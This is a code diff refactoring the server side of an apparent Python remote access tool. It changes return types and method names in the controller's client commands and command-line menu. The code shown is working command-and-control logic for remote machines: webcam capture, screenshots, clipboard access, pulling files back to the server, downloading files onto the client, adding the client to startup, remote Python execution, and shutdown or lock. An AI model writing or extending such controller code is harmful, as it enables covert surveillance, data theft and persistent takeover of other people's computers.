@@ -150,23 +150,23 @@ class Client():
         self.send_json(['GETCWD'])
         return self.receive().decode()
 
-    def clipboard(self) -> Tuple[bool, str]:
+    def paste(self) -> Tuple[bool, str]:
         """ Get Client Clipboard """
         # returns True/False, clipboard/error
         self.send_json(['PASTE'])
         return tuple(self.recv_json())
 
-    def fill_clipboard(self, data: str) -> Tuple[bool, Union[str, None]]:
+    def copy(self, data: str) -> Union[str, None]:
         """ Copy to Client Clipboard"""
-        # returns True/False, None/error
+        # returns None/error
         self.send_json(['COPY', data])
-        return tuple(self.recv_json())
+        return self.recv_json()
 
     def download(self, url: str, file_name: str) -> Tuple[bool, Union[str, None]]:
         """ Download File To Client """
-        # returns True/False, None/error
+        # returns None/error
         self.send_json(['DOWNLOAD', url, file_name])
-        return tuple(self.recv_json())
+        return self.recv_json()
 
     def log_path(self) -> str:
         """ Get Log File Name"""
@@ -195,97 +195,98 @@ class Client():
         self.receive()
         self.conn.close()
 
-    def add_startup(self) -> Tuple[bool, Union[str, None]]:
+    def add_startup(self) -> Union[str, None]:
         """ Add Client to Startup """
-        # returns True/False, None/error
+        # returns None/error
         self.send_json(['ADD_STARTUP'])
-        return tuple(self.recv_json())
+        return self.recv_json()
 
-    def remove_startup(self) -> Tuple[bool, Union[str, None]]:
+    def remove_startup(self) -> Union[str, None]:
         """ Remove Client from Startup """
-        # returns True/False, None/error
+        # returns None/error
         self.send_json(['REMOVE_STARTUP'])
-        return tuple(self.recv_json())
+        return self.recv_json()
 
     def lock(self) -> bool:
         """ Lock Client Machine (Windows Only) """
-        # Returns bool
+        # returns bool
         self.send_json(['LOCK'])
         return self.recv_json()
 
-    def shutdown(self) -> None:
+    def shutdown(self) -> bool:
         """ Shutdown Client Machine """
-        # returns None
+        # returns bool
         self.send_json(['SHUTDOWN'])
         return self.recv_json()
 
-    def restart(self) -> None:
+    def restart(self) -> bool:
         """ Restart Client Machine """
-        # returns None
+        # returns bool
         self.send_json(['RESTART'])
         return self.recv_json()
 
-    def send_file(self, file_to_transfer: str, save_as: str) -> Tuple[bool, Union[str, None]]:
+    def send_file(self, file_to_transfer: str, save_as: str) -> Union[str, None]:
         """ Send file from Server to Client """
-        # returns True/False, None/error
+        # returns None/error
         if not os.path.isfile(file_to_transfer):
-            return False, "FileNotFoundError"
+            return "FileNotFoundError"
         self.send_json(['SEND_FILE', save_as])
         if self.receive() == b'FILE_TRANSFER_ERROR':
             self.send(b'RECEIVED')
-            return False, self.receive().decode()
+            return self.receive().decode()
         for block in read_file(file_to_transfer):
             self.send(block)
             self.receive()
 
         self.send(b'FILE_TRANSFER_DONE')
         self.receive()
-        return True, None
+        return None
 
-    def receive_file(self, file_to_transfer: str, save_as: str) -> Tuple[bool, Union[str, None]]:
+    def receive_file(self, file_to_transfer: str, save_as: str) -> Union[str, None]:
         """ Transfer file from Client to Server """
-        # returns True/False, None/error
+        # returns None/error
         self.send_json(['RECEIVE_FILE', file_to_transfer])
         with open(save_as, 'wb') as wb_file:
             while 1:
                 data = self.receive()
                 if data == b'FILE_TRANSFER_ERROR':
                     self.send(b'RECEIVED')
-                    return False, self.receive().decode()
+                    os.remove(save_as)
+                    return self.receive().decode()
                 if data == b'FILE_TRANSFER_DONE':
                     self.send(b'RECEIVED')
                     break
                 wb_file.write(data)
                 self.send(b'RECEIVED')
         self.receive()
-        return True, None
+        return None
 
-    def screenshot(self, save_as: str = None) -> Tuple[bool, Union[str, None]]:
+    def screenshot(self, save_as: str = None) -> Union[str, None]:
         """ Take screenshot on Client """
-        # returns True/False, None/error
+        # returns None/error
         if not save_as:
             save_as = f'{_time()}.png'
         self.send_json(['SCREENSHOT'])
         data = self.receive()
         if data == b'ERROR':
             self.send(b'RECEIVING')
-            return False, self.receive()
+            return self.receive()
         with open(save_as, 'wb') as _file:
             _file.write(data)
-        return True, save_as
+        return None
 
-    def webcam(self, save_as: str = None) -> Tuple[bool, Union[str, None]]:
+    def webcam(self, save_as: str = None) -> Union[str, None]:
         """ Capture webcam """
-        # returns True/False, save_as/None
+        # returns save_as/None
         if not save_as:
             save_as = f'webcam-{_time()}.png'
         self.send_json(['WEBCAM'])
         data = self.receive()
         if data == b'ERROR':
-            return False, None
+            return None
         with open(save_as, 'wb') as _file:
             _file.write(data)
-        return True, save_as
+        return save_as
 
     def exec(self, command: str) -> Tuple[str, Union[str, None]]:
         """ Remote Python Interpreter """
@@ -370,23 +371,23 @@ class Client():
             print(info)
         return info
 
-    def zip_file(self, zip_filename: str, file_to_zip: str) -> Tuple[bool, Union[str, None]]:
+    def zip_file(self, zip_filename: str, file_to_zip: str) -> Union[str, None]:
         """ Zip a Single File """
-        # returns True/False, None/error
+        # returns None/error
         self.send_json(['ZIP_FILE', zip_filename, file_to_zip])
-        return tuple(self.recv_json())
+        return self.recv_json()
 
-    def zip_dir(self, zip_filename: str, dir_to_zip: str) -> Tuple[bool, Union[str, None]]:
+    def zip_dir(self, zip_filename: str, dir_to_zip: str) -> Union[str, None]:
         """ Zip a Directory """
-        # returns True/False, None/error
+        # returns None/error
         self.send_json(['ZIP_DIR', os.path.splitext(zip_filename)[0], dir_to_zip])
-        return tuple(self.recv_json())
+        return self.recv_json()
 
-    def unzip(self, zip_filename: str) -> Tuple[bool, Union[str, None]]:
+    def unzip(self, zip_filename: str) -> Union[str, None]:
         """ Unzip a File """
-        # returns True/False, None/error
+        # returns None/error
         self.send_json(['UNZIP', zip_filename])
-        return tuple(self.recv_json())
+        return self.recv_json()
 
 
 class Server():
@@ -488,7 +489,7 @@ class ServerCLI(Server):
         self._print_event.set()
         self.stop()
 
-    def list_connections(self) -> None:
+    def list(self) -> None:
         """ List all connections """
         self.refresh()
         print('----- Clients -----')
@@ -564,15 +565,15 @@ class ServerCLI(Server):
                 print()
         elif command == 'screenshot':
             print('Taking Screenshot...')
-            result, error = client.screenshot()
-            if result:
-                print('Saved Screenshot.')
-            else:
+            error = client.screenshot()
+            if error:
                 print(f'Error Taking Screenshot: {error.decode()}')
+            else:
+                print('Saved Screenshot.')
         elif command == 'webcam':
             print('Accessing webcam...')
-            result, _ = client.webcam()
-            if result:
+            save_as = client.webcam()
+            if save_as:
                 print('Saved webcam image')
             else:
                 print('Webcam Capture Error')
@@ -602,76 +603,76 @@ class ServerCLI(Server):
             file_to_transfer = input('File to Transfer to Client: ')
             save_as = input('Save as: ')
             print('Transferring file...')
-            result, error = client.send_file(file_to_transfer, save_as)
-            if result:
-                print('File transferred.')
-            else:
+            error = client.send_file(file_to_transfer, save_as)
+            if error:
                 print(f'Error transferring file: {error}')
+            else:
+                print('File transferred.')
         elif command == 'receive':
             file_to_transfer = input('File to Transfer to Server: ')
             save_as = input('Save as: ')
             print('Transferring file...')
-            result, error = client.receive_file(file_to_transfer, save_as)
-            if result:
-                print('File transferred.')
-            else:
+            error = client.receive_file(file_to_transfer, save_as)
+            if error:
                 print(f'Error transferring file: {error}')
+            else:
+                print('File transferred.')
         elif command == 'download':
             file_url = input('File URL: ')
             file_name = input('Filename: ')
             print('Downloading File...')
-            result, error = client.download(file_url, file_name)
-            if result:
-                print('Downloaded file successfully')
-            else:
+            error = client.download(file_url, file_name)
+            if error:
                 print(error)
+            else:
+                print('Downloaded file successfully')
         elif command == 'zip':
             if select == 'file':
                 save_as = input('Zip Filename: ')
                 file_to_zip = input('File to Zip: ')
-                result, error = client.zip_file(save_as, file_to_zip)
-                if result:
-                    print('Zipping Successful.')
-                else:
+                error = client.zip_file(save_as, file_to_zip)
+                if error:
                     print(error)
+                else:
+                    print('Zipping Successful.')
             elif select == 'dir':
                 save_as = input('Zip Filename: ')
                 dir_to_zip = input('Directory to Zip: ')
-                result, error = client.zip_dir(save_as, dir_to_zip)
-                if result:
-                    print('Zipped Directory Successfully.')
-                else:
+                error = client.zip_dir(save_as, dir_to_zip)
+                if error:
                     print(error)
+                else:
+                    print('Zipped Directory Successfully.')
             elif select == 'unzip':
                 zip_filename = input('Zip File: ')
-                result, error = client.unzip(zip_filename)
-                if result:
-                    print('Unzipped Successfully.')
-                else:
+                error = client.unzip(zip_filename)
+                if error:
                     print(error)
+                else:
+                    print('Unzipped Successfully.')
         elif command == 'copy':
             text_to_copy = input('Text to copy: ')
-            result, error = client.fill_clipboard(text_to_copy)
-            if result:
-                print('Copied to Clipboard.')
-            else:
+            error = client.copy(text_to_copy)
+            if error:
                 print(error)
+            else:
+                print('Copied to Clipboard.')
         elif command == 'paste':
-            _, output = client.clipboard()
+            _, output = client.paste()
             print(output)
         elif command == 'startup':
             if select == 'add':
-                result, error = client.add_startup()
-                if result:
+                error = client.add_startup()
+                if error:
+                    print(error)
+                else:
                     print('Client added to Startup')
-                else:
-                    print(error)
             elif select == 'remove':
-                result, error = client.remove_startup()
-                if result:
-                    print('Removed Client from Startup')
-                else:
+                error = client.remove_startup()
+                if error:
                     print(error)
+                else:
+                    print('Removed Client from Startup')
         elif command == 'client':
             if select == 'lock':
                 if client.lock():
@@ -700,13 +701,12 @@ class ServerCLI(Server):
                 return True
             elif select == 'disconnect':
                 print('Disconnecting Client...')
-                client.disconnect()
-                self.refresh()
+                server.disconnect(client)
                 return True
             elif select == 'close':
                 print('Closing Client...')
                 client.close()
-                self.refresh()
+                server.disconnect(client)
                 return True
         elif command == 'back':
             return True
@@ -745,7 +745,7 @@ class ServerCLI(Server):
                 elif command == 'broadcast':
                     self.broadcast(input('Command to broadcast: '))
                 elif command == 'list':
-                    self.list_connections()
+                    self.list()
                 elif command[:4] == 'open':
                     client = self.get_target(command)
                     if client:
